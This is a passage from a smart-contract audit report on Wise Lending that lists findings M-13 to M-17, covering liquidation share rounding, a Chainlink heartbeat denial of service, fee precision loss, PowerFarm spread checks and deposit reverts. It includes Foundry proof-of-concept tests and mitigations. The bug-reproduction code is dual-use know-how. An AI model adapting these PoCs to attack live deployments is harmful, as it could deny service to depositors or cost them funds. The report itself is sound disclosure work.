> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

*Note, this finding was downgraded to Medium by C4 staff in reference to the Appellate Court decision.*

***

## [[M-13] Incorrect calculation of lending shares in `_withdrawOrAllocateSharesLiquidation` can lead to revert and failure to liquidate](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/116)
*Submitted by [WoolCentaur](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/116), also found by [SBSecurity](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/281) and [AM](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/238)*

When liquidating a user, `_withdrawOrAllocateSharesLiquidation()` can be called which checks if a pool is large enough to pay out the liquidator, and if not, then the liquidator is allocated shares that can be used to withdraw at a later time when the pool is large enough. There are two scenarios in which the pool will not be large enough to pay out the liquidator:

1. The obvious scenario where the pool simply doesn't contain enough tokens to cover the withdraw amount.
2. So many tokens are borrowed out of the pool that there isn't enough available to pay out the liquidator.

Note: If there are some tokens available but not enough to cover the entire withdraw amount, then those tokens are transferred, dropping the total pool to `0`, and the rest are allocated as shares.

However, if these scenarios were ever to arise, the `_withdrawOrAllocateSharesLiquidation()` function would not work as expected. This is due to how it calculates the lending shares (`totalPoolInShares`) of the total pool:

<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L493>

When liquidating, it will calculate the `totalPoolInShares` like this (with amount being the total pool):

```
       lendingShares = (totalDepositShares * amount) / pseudoTotalPool - 1;
```

However, calculating the lending shares this way will cause the `_compareSharePrices()` to revert on the `syncPool` modifier. Specifically the check on

        _validateParameter(
            _lendSharePriceBefore,
            lendSharePriceAfter
        );

This is because `_maxSharePrice` is passed in as false to `calculateLendingShares()`, which subtracts one.

```
    uint256 totalPoolInShares = calculateLendingShares(
                {
                    _poolToken: _poolToken,
                    _amount: totalPoolToken,
                    _maxSharePrice: false
                }
            );
```

<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L497>

However, because we are withdrawing, it should be set to true so that it adds one. In all other areas where `calculateLendingShares()` is being used, the functions that focus on withdrawing have `_maxSharePrice: true` and the depositing functions have `_maxSharePrice: false`:

[`withdrawOnBehalfExactAmount` on `WiseLending.sol`](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseLending.sol#L874>).

[`_preparationsWithdraw` on `MainHelper.sol`](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/MainHelper.sol#L154>).

[`_handleDeposit` on `WiseCore.sol`](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L119>).

When `_maxSharePrice` is set to true, the `_validateParameter()` check will pass.

Even if the `_validateParameter()` check did not exist, if `_maxSharePrice` is left as-is (set to false), any subsequent liquidations through `_withdrawOrAllocateSharesLiquidation()` would revert with panic due to an underflow. This is because (as stated above), liquidating when the pool is not large enough to pay out the liquidator will drop the total pool to `0` and issue the remainder as shares. Therefore, any subsequent calls to liquidate when the total pool is `0` will underflow:

```
        //amount is totalPoolToken which in this scenario = 0;
        shares = amount * totalDepositShares / pseudoTotalPool - 1
```

### Impact

When a particular receiving token is desired and `_withdrawOrAllocateSharesLiquidation()` is called, the liquidation will always revert if the total pool is not large enough to cover the withdraw amount. This defeats the purpose of `_withdrawOrAllocateSharesLiquidation()`, as stated in the NatSpec:

```
    /**
         * @dev Internal math function for liquidation logic
         * which checks if pool has enough token to pay out
         * liquidator. If not, liquidator get corresponding
         * shares for later withdraw.
         */
```

This will lead to frustrated users who desire a particular receiving token. The level of frustration will be even higher if the reason this function reverts is because the total pool is borrowed out. This would lead to a very high APY, thus a much higher desire to receive the particular token. Additionally, the borrowers in these particular situations will not be liquidated even though they should be. Ultimately, this will lead to loss of faith in the protocol.

However, this can be easily avoided by just passing in a different receiving token that is large enough to payout the withdraw amount, which is why this is a medium level issue.

### Proof of Concept

Copy and paste this foundry test into the `/contracts` folder and run `forge test --fork-url mainnet --match-path ./contracts/WoolCentaurLiquidationTest.t.sol --match-test testLiquidateMockPool  -vvvv`.  As the code is, the test will fail.  To have it pass, change the bool [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/WiseCore.sol#L497>)
to `true`.

<details>

```
    // SPDX-License-Identifier: -- WISE --

    pragma solidity =0.8.24;


    import "forge-std/Test.sol";
    import "forge-std/StdUtils.sol";
    import "./InterfaceHub/IBalancerFlashloan.sol";
    import "./InterfaceHub/IWiseLending.sol";
    import "./InterfaceHub/ICurve.sol";
    import "./InterfaceHub/IAaveHub.sol";
    import "./InterfaceHub/IAave.sol";
    import "./InterfaceHub/IPositionNFTs.sol";
    import "./WiseLendingBaseDeployment.t.sol";
    import "./PoolManager.sol";



    contract WoolCentaur is BaseDeploymentTest {

            function testLiquidateMockPool() public {
                /////////////////////////////
                // Setup new fork and deal tokens
                _useBlock(
                    NEW_BLOCK
                );

                _deployNewWiseLending(
                    {
                        _mainnetFork: false
                    }
                );

                vm.deal(address(1), 2000 ether);
                vm.deal(WISE_DEPLOYER, 1000 ether);
                address paybackToken = address(MOCK_AAVE_ATOKEN_3);
                address receivingToken = address(MOCK_AAVE_ATOKEN_4);
                address mockWETH = address(MOCK_WETH);
                deal(paybackToken, WISE_DEPLOYER, 11000e6);
                deal(receivingToken, address(1), 200000e6);
                deal(mockWETH, WISE_DEPLOYER, 1000e18);
                deal(mockWETH, address(1), 1000e18);

                //Mint position nfts to address 1
                _startPrank(
                    address(1)
                );

                POSITION_NFTS_INSTANCE.mintPosition();

                uint256[] memory nftsOfOwner1 = POSITION_NFTS_INSTANCE.walletOfOwner(
                    address(1)
                );

                uint256 nftIdFirst = nftsOfOwner1[0];

                _stopPrank();

                // Mint position nfts to WISE_DEPLOYER
                _startPrank(
                    WISE_DEPLOYER
                );
                POSITION_NFTS_INSTANCE.mintPosition();

                uint256[] memory nftsOfOwner2 = POSITION_NFTS_INSTANCE.walletOfOwner(
                    WISE_DEPLOYER
                );

                uint256 nftIdSecond = nftsOfOwner2[0];
                
                skip(10);

                //Approve and deposit the payback tokens
                IERC20(paybackToken).approve(
                    address(LENDING_INSTANCE),
                    10000e6
                );

                LENDING_INSTANCE.depositExactAmount(
                    nftIdSecond,
                    paybackToken,
                    10000e6
                );

                //Approve and deposit the collateral tokens
                IERC20(mockWETH).approve(
                    address(LENDING_INSTANCE),
                    1000e18
                );

                LENDING_INSTANCE.depositExactAmount(
                    nftIdSecond,
                    mockWETH,
                    1000e18
                );

                _stopPrank();

        
                _startPrank(
                    address(1)
                );
                //Deposit collateral tokens
                LENDING_INSTANCE.depositExactAmountETH{
                    value: 2000 ether
                }(nftIdFirst);

                //Set the value of the receiving token
                MOCK_CHAINLINK_4.setValue(
                    0.00000000000000001 ether
                );
                //Approve and deposit the receiving token
                IERC20(receivingToken).approve(
                    address(LENDING_INSTANCE),
                    20000e6
                );

                LENDING_INSTANCE.depositExactAmount(
                    nftIdFirst,
                    receivingToken,
                    20000e6
                );
                //Set the value of the payback token
                MOCK_CHAINLINK_3.setValue(
                    0.00000000000000001 ether
                );
                //Liquidatee borrows 100% the payback token
                LENDING_INSTANCE.borrowExactAmount(
                    nftIdFirst,
                    paybackToken,
                    10000e6
                );
                //Set the new value of payback token, pushing it into bad debt so it can be liquidated
                MOCK_CHAINLINK_3.setValue(
                    0.00000001 ether
                );

                _stopPrank();


                _startPrank(
                    WISE_DEPLOYER
                );
                //Liquidator borrows 100% of the receivingToken so shares must be issued
                LENDING_INSTANCE.borrowExactAmount(
                    nftIdSecond,
                    receivingToken,
                    20000e6
                );


                skip(6000);
                (, uint256 liquidateeLendingSharesBefore) = LENDING_INSTANCE.userLendingData(nftIdFirst, (receivingToken));
                (, uint256 liquidatorLendingSharesBefore) = LENDING_INSTANCE.userLendingData(nftIdSecond, (receivingToken));
                //assert that the liquidator starts with 0 shares
                assertEq(liquidatorLendingSharesBefore, 0);
                emit log_named_uint("shares of liquidatee before", liquidateeLendingSharesBefore);
                emit log_named_uint("shares of liquidator before", liquidatorLendingSharesBefore);
                //Approve and liquidate the respective shares and tokens
                IERC20(paybackToken).approve(
                    address(LENDING_INSTANCE),
                    11
                );

                LENDING_INSTANCE.liquidatePartiallyFromTokens(
                    nftIdFirst,
                    nftIdSecond,
                    paybackToken,
                    receivingToken,
                    10
                );
                _stopPrank();

                (, uint256 liquidateeLendingSharesAfter) = LENDING_INSTANCE.userLendingData(nftIdFirst, (receivingToken));
                (, uint256 liquidatorLendingSharesAfter) = LENDING_INSTANCE.userLendingData(nftIdSecond, (receivingToken));
                //asserts that the liquidator shares have increased
                assertNotEq(liquidatorLendingSharesAfter, 0);
                emit log_named_uint("shares of liquidatee after", liquidateeLendingSharesAfter);
                emit log_named_uint("shares of liquidator after", liquidatorLendingSharesAfter);
                //asserts that the liquidatee + the liquidator = the total shares
                assertEq(liquidateeLendingSharesAfter + liquidatorLendingSharesAfter, 19999999998);
            }
    }
```

</details>

### Tools Used

Foundry

### Recommended Mitigation Steps

Change the `_maxSharePrice` under `calculateLendingShares` on `_withdrawOrAllocateSharesLiquidation()` to true.

### Assessed type

Error

**[vm06007 (Wise Lending) commented via duplicate issue #238](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/238#issuecomment-2002357694):**
> That seems to be like a desired functionality by design and expected behavior. @vonMangoldt can confirm.

**[vonMangoldt (Wise Lending) commented via duplicate issue #238](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/238#issuecomment-2003980386):**
> This looks right from my first looking into it. Just curious why it didn't DOS in our javascript tests. Probably the percentage roundings (etc.) need to be aligned for that behaviour.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/116#issuecomment-2020926895):**
 > Selected as best because of good POC + well balanced severity rationalization.

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/116#issuecomment-2082920876):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***

## [[M-14] Current heartbeat implementation may lead to a prolonged DoS for Chainlink Oracles](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/87)
*Submitted by [00xSEV](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/87)*

Currently, if there are 50 fast updates followed by no updates, a Chainlink Oracle will be considered dead, even though it's normal behavior. Chainlink Oracles update either after some time has passed or upon a price change.

### Vulnerability Details

**How it will revert:**

There is a `_chainLinkIsDead` function that returns true if the last update took longer than the heartbeat. See [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/1240a22a3bbffc13d5f8ae6300ef45de5edc7c19/contracts/WiseOracleHub/OracleHelper.sol#L579-L585>).

```solidity
unchecked {
	upd = block.timestamp < upd
		? block.timestamp
		: block.timestamp - upd;

	return upd > heartBeat[_tokenAddress];
}
```

It's essentially called on every request to the Chainlink Oracle, before the actual call, to ensure the price is up to date.

**How does recalibrate work?**

`heartBeat` is updated when `recalibrate`/`recalibrateBulk` is called. Anyone can call them. Both of these functions call `_recalibrate`. See [here](<https://github.com/code-423n4/2024-02-wise-lending/blob/1240a22a3bbffc13d5f8ae6300ef45de5edc7c19/contracts/WiseOracleHub/OracleHelper.sol#L512-L514>).

```solidity
        heartBeat[_tokenAddress] = _recalibratePreview(
            _tokenAddress
        );
```

In [`_recalibratePreview`](https://github.com/code-423n4/2024-02-wise-lending/blob/1240a22a3bbffc13d5f8ae6300ef45de5edc7c19/contracts/WiseOracleHub/OracleHelper.sol#L651), we see that `currentSecondBiggest` is returned, representing the second-largest difference between updates. Thus, `heartBeat` is set to the second-largest time difference between two consecutive updates in the last 50 updates. `iterationCount` is capped by `MAX_ROUND_COUNT` in `_getIterationCount`, which is set to 50.

**[How do Chainlink updates work](https://docs.chain.link/architecture-overview/architecture-decentralized-model?parent=dataFeeds#aggregator)?**

> Aggregators receive updates from the Oracle network only when the **Deviation Threshold** or **Heartbeat Threshold** triggers an update during an aggregation round. The first condition that is met triggers an update to the data.
>
> - Deviation Threshold: A new aggregation round starts when a node identifies that the off-chain values deviate by more than the defined deviation threshold from the onchain value. Individual nodes monitor one or more data providers for each feed.
> - Heartbeat Threshold: A new aggregation round starts after a specified amount of time from the last update.

If you check "Show more details" [here](https://docs.chain.link/data-feeds/price-feeds/addresses?network=ethereum\&page=1), you can see that for most feeds, deviation is set to 1-2% and heartbeat is `86400s = 24` hours. However, some feeds are set to 0.5% or even less.

If there's a period of high volatility followed by no volatility, it's possible that `heartBeat` in Wise will be set to a low value. Consequently, the Chainlink feed will be considered dead after a short period of no updates.

E.g., if there are 50 updates, once every minute, followed by 10 hours of no updates, and then no updates for an additional 24 hours, the `heartBeat` will be set to 1 minute in Wise. Consequently, the Oracle will be considered dead after 1 minute of no updates. This means it will be considered dead for the initial 10 hours, then considered alive for 1 minute, and then considered dead again for the following 24 hours.

Examples demonstrating similar events in the wild can be seen in [this Dune dashboard](<https://dune.com/00xsev/answer-updated-counters>).

### Impact

The Chainlink Oracle is considered dead for a substantial amount of time, affecting liquidations, deposits, withdrawals, and all other functions using this Oracle.

The attacker can disable the entire market that uses the Oracle by calling recalibrate. This can lead to bad debt (the price changes rapidly, but the Oracle still reverts after the first update), griefing (users cannot use the protocol), etc.

It can be even worse if combined with block stuffing or when the gas price is too high and Chainlink does not update. The updates stop coming as often as usual, and the feed is considered dead long enough to accrue bad debt. For example, if the last 50 updates occurred every minute, a sudden spike in demand for block space could make updates come only once an hour, preventing liquidations for 1-2 hours.

### Proof of Concept

`forge test -f https://mainnet.infura.io/v3/YOUR_KEY -vvv --mt testOne --mc ChainlinkDies$`

`contracts/Tests/ChainlinkDies.t.sol`

<details>

```solidity
pragma solidity =0.8.24;

import "forge-std/console.sol";
import "forge-std/Test.sol";
import "../WiseOracleHub/OracleHelper.sol";


contract OracleHelperMock is OracleHelper {
    constructor(
        address _wethAddress,
        address _ethPriceFeed,
        address _uniswapV3Factory
    ) Declarations(_wethAddress, _ethPriceFeed, _uniswapV3Factory) {
        
    }

    function addOracle(
        address _tokenAddress,
        IPriceFeed _priceFeedAddress,
        address[] calldata _underlyingFeedTokens
    ) external {
        _addOracle(
            _tokenAddress,
            _priceFeedAddress,
            _underlyingFeedTokens
        );
    }

    function recalibrate(
        address _tokenAddress
    )
        external
    {
        _recalibrate(_tokenAddress);
    }

    function chainLinkIsDead(
        address _tokenAddress
    )
        external
        view
        returns (bool)
    {
       return _chainLinkIsDead(_tokenAddress);
    }
}

interface PartialAccessControlledOffchainAggregator is IPriceFeed {
    function disableAccessCheck() external;
    function owner() external returns (address);
    function checkEnabled() external returns (bool);
}

contract ChainlinkDies is Test {
    address WETH_ADDRESS = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address ETH_PRICE_FEED = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;

    address FEI = 0x956F47F50A910163D8BF957Cf5846D573E7f87CA;
    PartialAccessControlledOffchainAggregator FEI_ETH_FEED = 
        PartialAccessControlledOffchainAggregator(0x4bE991B4d560BBa8308110Ed1E0D7F8dA60ACf6A);

    uint LAST_NORMAL_BLOCK = 16_866_049;
    // one block before the update after no updates for a day
    uint TARGET_BLOCK = 16_872_122; 

    function testOne() external {
        OracleHelperMock sut = _test(LAST_NORMAL_BLOCK);
        assertFalse(sut.chainLinkIsDead(FEI));

        sut = _test(TARGET_BLOCK);
        assert(sut.chainLinkIsDead(FEI));
    }

    function _test(uint blockNumber) internal returns (OracleHelperMock) {
        vm.rollFork(blockNumber);

        vm.prank(FEI_ETH_FEED.owner());
        FEI_ETH_FEED.disableAccessCheck();
        assertFalse(FEI_ETH_FEED.checkEnabled());

        OracleHelperMock sut = new OracleHelperMock(WETH_ADDRESS, ETH_PRICE_FEED, UNISWAP_V3_FACTORY);
        // make sure recalibrate works
        sut.addOracle( {
            _tokenAddress: FEI,
            _priceFeedAddress: FEI_ETH_FEED,
            _underlyingFeedTokens: new address[](0)
        } );
        sut.recalibrate(FEI);
        console.log("block:", blockNumber);
        console.log("chainLinkIsDead:", sut.chainLinkIsDead(FEI));

        return sut;
    }


}
```

</details>

### Recommended Mitigation Steps

Consider setting Chainlink's native heartbeat instead. Also consider adding access control to `recalibrate` functions and only calling it when it will not lead to DoS.

### Assessed type

Oracle

**[vonMangoldt (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/87#issuecomment-2009125717):**
 > It takes second highest out of last 50 rounds if you recalibrate. If it takes forever to update for chainlink it means there is no volatility. So dismissed.

**[Trust (judge) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/87#issuecomment-2020987565):**
 > Warden discussed a potential scenario when the Oracle would be considered dead after just one minute of inactivity. 

**[vm06007 (Wise Lending) commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/87#issuecomment-2032193902):**
 > @Trust - it depends on the expected heartbeat, if it's one minute, and latest data does not come within that frame then Oracle SHOULD be considered dead.
> 
> Example: `recalibrate()` looks for second longest time gap between latest 50 (or 500 depending on chain) rounds, by analyzing timegaps between reported prices in last 50/500 rounds contract chooses appropriate expected timeframe when Oracle needs to answer before considered dead. If the time frame is too short this is only because that what was picked up from latest round data and should be honored (unlike this finding).
> 
> Note that it can be recalibrated to increase the expected time if needed.

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/87#issuecomment-2082921804):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***

## [[M-15] Precision loss in the calculation of the fee amounts and fee shares inside the `_preparePool` function of the `MainHelper` contract](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/79)
*Submitted by [Matin](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/79)*

Low fee amounts and fee shares are calculated in the preparation part due to the precision loss.

### Proof of Concept

Solidity rounds down the result of an integer division, and because of that, it is always recommended to multiply before dividing to avoid that precision loss. In the case of a prior division over multiplication, the final result may face serious precision loss as the first answer would face truncated precision and then multiplied to another integer.

The problem arises in the pool's preparation part before applying the LASA algorithm. After cleaning up the pool, the next step is to update the pseudo amounts and adding the corresponding fee shares of that pool.

If we look deeply at the function `_updatePseudoTotalAmounts()` we can see the fee shares calculation procedure is presented as:

```solidity
        uint256 amountInterest = bareIncrease
            / PRECISION_FACTOR_YEAR;

        uint256 feeAmount = amountInterest
            * globalPoolData[_poolToken].poolFee
            / PRECISION_FACTOR_E18;
```

We can see there is a hidden division before a multiplication that makes round down the whole expression. This is bad as the precision loss can be significant, which leads to the pool printing less `feeAmount` than actual.

Also, it is better to mention that some protocols implement this method to have an integer part of the division (usually in time-related situations). But we can clearly see that this pattern is used in the calculation of `feeAmount` at which the precision matters.
Furthermore, the mentioned error will escalate, especially when the `bareIncrease` is bigger but close to the `PRECISION_FACTOR_YEAR` amount. The precision loss becomes more serious at lower discrepancies (such as `1.2 ~ 2` magnitudes of `PRECISION_FACTOR_YEAR`).

As for the Proof of Concept part, we can check this behavior precisely. You can run this code to see the difference between the results:

```solidity
    function test_precissionLoss() public {

        uint x = (PRECISION_FACTOR_YEAR * 3)/ 2; // This number represents the `bareIncrease`
        uint256 poolFee = 789600000000000000000000; // This number represents the `poolFee`

        uint256 amountInterest = x
            / PRECISION_FACTOR_YEAR;

        uint256 feeAmount1 = amountInterest
            * poolFee
            / PRECISION_FACTOR_E18;

        uint256 feeAmount2 = (x * poolFee) / (PRECISION_FACTOR_YEAR * PRECISION_FACTOR_E18);
        
        console.log("Current Implementation ", feeAmount1);
        console.log("Actual Implementation ", feeAmount2);
    }
```

The result would be: (for 1.5 of `PRECISION_FACTOR_YEAR`):

```
         Current Implementation  789600
         Actual Implementation  1184400
```

Thus, we can see that the actual implementation produces less fee amount than the precise method. This test shows a big difference between the two calculated fee amounts in the LASA algorithm.

### Tools Used

Forge

### Recommended Mitigation Steps

Consider modifying the fee shares calculation to prevent such precision loss and prioritize the multiplication over division:

```solidity
        uint256 amountInterest = bareIncrease
            / PRECISION_FACTOR_YEAR;

        uint256 feeAmount = bareIncrease
            * globalPoolData[_poolToken].poolFee
            / (PRECISION_FACTOR_E18 * PRECISION_FACTOR_YEAR);
```

### Assessed type

Math

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/79#issuecomment-2082922984):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***

## [[M-16] A user can lose more value than he specifies in the spread when he enters a `PowerFarm`](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/31)
*Submitted by [nonseodion](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/31)*

When a user enters or exits a `PowerFarm`, he specifies an allowed spread. The spread specifies the minimum value of the position allowed at the end of the transaction.

E.g. a spread of 105% on a position with a value of `$1000` ensures the value does not fall below `$950`.

`1000 * (200-105) / 100 = 950`

When a user opens a position on Arbitrum, the `ENTRY_ASSET` is converted to WETH on UniswapV3. The second argument in line 434 specifies the minimum value for the swap. The spread is applied to this argument. Hence, the `_depositAmount` in line 432 cannot go less than what the spread allows.

[PendlePowerFarmLeverageLogic.sol#L423-L440](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L423-L440)

```solidity
426:         uint256 reverseAllowedSpread = 2
427:             * PRECISION_FACTOR_E18
428:             - _allowedSpread;
429: 
430:         if (block.chainid == ARB_CHAIN_ID) {
431: 
432:             _depositAmount = _getTokensUniV3(
433:                 _depositAmount,
434:                 _getEthInTokens(
435:                         ENTRY_ASSET,
436:                         _depositAmount
437:                     )
438:                 * reverseAllowedSpread
439:                 / PRECISION_FACTOR_E18,
440:                 WETH_ADDRESS,
441:                 ENTRY_ASSET
442:             );
443:         }
```

The value at the end of the transaction is checked in line 508 below to ensure it does not go below the allowed spread. The `ethValueBefore` is calculated from `_depositAmount` in line 489. Note that if the swap on Uniswap occurred the `_depositAmount` may already be the minimum value. The `ethValueAfter` is scaled with the allowed spread in line `501`.

[PendlePowerFarmLeverageLogic.sol#L485-L505](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L485-L505)

```solidity
489:         uint256 ethValueBefore = _getTokensInETH(
490:             ENTRY_ASSET,
491:             _depositAmount
492:         );
493: 
494:         (
495:             uint256 receivedShares
496:             ,
497:         ) = IPendleChild(PENDLE_CHILD).depositExactAmount(
498:             netLpOut
499:         );
500:         // @audit-issue the calculation for ethValueAfter below is incorrect
501:         uint256 ethValueAfter = _getTokensInETH(
502:             PENDLE_CHILD,
503:             receivedShares
504:         )
505:             * _allowedSpread
506:             / PRECISION_FACTOR_E18;
507:         // @audit-issue ethValueBefore on Arbitrum uses the depositAmount that allowedSpread has already been applied
508:         if (ethValueAfter < ethValueBefore) {
509:             revert TooMuchValueLost();
510:         }
```

Thus the comparison in line 508 may compare `ethValueAfter` with the minimum value of the spread instead of the value of the initial deposit. With this implementation, if the spread for a `$1000` transaction is 105%, the minimum value after the transaction becomes `$902.5`.

`(1000 * 95 / 100) * (95/100) = 902.5`. The user can lose `$47.5` (`950-902.5`).

Note: In the implementation, the value at the end is scaled up instead of the value at the beginning being scaled down like the examples show. Hence, the actual minimum value is lesser i.e. `~$904.76` (`950/1.05`). This is a different bug.

### Proof of Concept

1. A user enters the market with `$1000` of WBTC and specifies a spread of 105%.
2. At the end of the transaction the comparison is done against `$950`. So the actual value he gets can be between `~$904.76` and `$950` and the transaction would pass.
3. The user may lose between `$0` and `$45.24` (`950 - 904.76`).

### Recommended Mitigation Steps

Consider storing the actual deposit and using it to calculate `ethValueBefore`.

[PendlePowerFarmLeverageLogic.sol#L423-L488](https://github.com/code-423n4/2024-02-wise-lending/blob/79186b243d8553e66358c05497e5ccfd9488b5e2/contracts/PowerFarms/PendlePowerFarm/PendlePowerFarmLeverageLogic.sol#L423-L488)

```solidity
        uint256 reverseAllowedSpread = 2
            * PRECISION_FACTOR_E18
            - _allowedSpread;
+       unit256 actualDeposit = _depositAmount;
        if (block.chainid == ARB_CHAIN_ID) {

            _depositAmount = _getTokensUniV3(
                _depositAmount,
                _getEthInTokens(
                        ENTRY_ASSET,
                        _depositAmount
                    )
                * reverseAllowedSpread
                / PRECISION_FACTOR_E18,
                WETH_ADDRESS,
                ENTRY_ASSET
            );
        }

    ...
    
        uint256 ethValueBefore = _getTokensInETH(
            ENTRY_ASSET,
-            _depositAmount
+.           actualDeposit
        );

```

### Assessed type

Uniswap

**[Wise Lending commented](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/31#issuecomment-2082924786):**
> Mitigated [here](https://github.com/wise-foundation/lending-audit/commit/ac68b5a93976969d582301fee9f873ecec606df9).

***

## [[M-17] User's attempt to deposit & withdraw reverts due to the calculation style inside `_calculateShares()`](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/27)
*Submitted by [t0x1c](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/27), also found by [DanielArmstrong](https://github.com/code-423n4/2024-02-wise-lending-findings/issues/120)*

**Scenario 1:**

The following flow of events (one among many) causes a revert:

1. Alice calls [`depositExactAmountETH()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L388) to deposit `1 ether`. This executes successfully, as expected.
2. Bob calls [`depositExactAmountETH()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L388) to deposit `1.5 ether` (or `0.5 ether` or `1 ether` or `2 ether` or any other value). This reverts unexpectedly.

In case Bob was attempting to make this deposit to rescue his soon-to-become or already bad debt and to avoid liquidation, this revert will delay his attempt which could well be enough for him to be liquidated by any liquidator, causing loss of funds for Bob. Here's a concrete example with numbers:

1. Bob calls [`depositExactAmountETH()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L388) to deposit `1 ether`. This executes successfully, as expected.
2. Bob calls [`borrowExactAmountETH()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L975) to borrow `0.7 ether`. This executes successfully, as expected.
3. Bob can see that price is soon going to spiral downward and cause a bad debt. He plans to deposit some additional collateral to safeguard himself. He calls [`depositExactAmountETH()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L388) again to deposit `0.5 ether`. This reverts unexpectedly.
4. Prices go down and he is liquidated.

**Scenario 2:**

A similar revert occurs when the following flow of events occur:

1. Alice calls [`depositExactAmountETH()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L388) to deposit `10 ether`. This executes successfully, as expected.
2. Bob calls [`withdrawExactAmountETH()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L636) to withdraw `10 ether` (or `10 ether - 1` or `10 ether - 1000` or `9.5 ether` or `9.1 ether`). This reverts unexpectedly.

Bob is not able to withdraw his entire deposit. If he leaves behind `1 ether` and withdraws only `9 ether`, then he does not face a revert.

In both of the above cases, eventually the revert is caused by the validation failure on [L234-L237](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L234-L237) due to the check inside `_validateParameter()`:

```js
  File: contracts/WiseLending.sol

  210:              function _compareSharePrices(
  211:                  address _poolToken,
  212:                  uint256 _lendSharePriceBefore,
  213:                  uint256 _borrowSharePriceBefore
  214:              )
  215:                  private
  216:                  view
  217:              {
  218:                  (
  219:                      uint256 lendSharePriceAfter,
  220:                      uint256 borrowSharePriceAfter
  221:                  ) = _getSharePrice(
  222:                      _poolToken
  223:                  );
  224:
  225:                  uint256 currentSharePriceMax = _getCurrentSharePriceMax(
  226:                      _poolToken
  227:                  );
  228:
  229:                  _validateParameter(
  230:                      _lendSharePriceBefore,
  231:                      lendSharePriceAfter
  232:                  );
  233:
  234: @--->            _validateParameter(
  235: @--->                lendSharePriceAfter,
  236: @--->                currentSharePriceMax
  237:                  );
  238:
  239:                  _validateParameter(
  240:                      _borrowSharePriceBefore,
  241:                      currentSharePriceMax
  242:                  );
  243:
  244:                  _validateParameter(
  245:                      borrowSharePriceAfter,
  246:                      _borrowSharePriceBefore
  247:                  );
  248:              }
```

### Root Cause

1. [`_compareSharePrices()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L219) is called by [`_syncPoolAfterCodeExecution()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L319) which is executed due to the [`syncPool`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L109) modifier attached to [`depositExactAmountETH()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L393).
2. Before `_syncPoolAfterCodeExecution()` in the above step is executed, the following internal calls are made by `depositExactAmountETH()`:
    - The [`_handleDeposit()`](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseCore.sol#L106) function is called on [L407](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/WiseLending.sol#L407) which in-turn calls `calculateLendingShares()` on [L115](https://github.com/code-423n4/2024-02-wise-lending/blob/main/contracts/MainHelper.sol#L115).
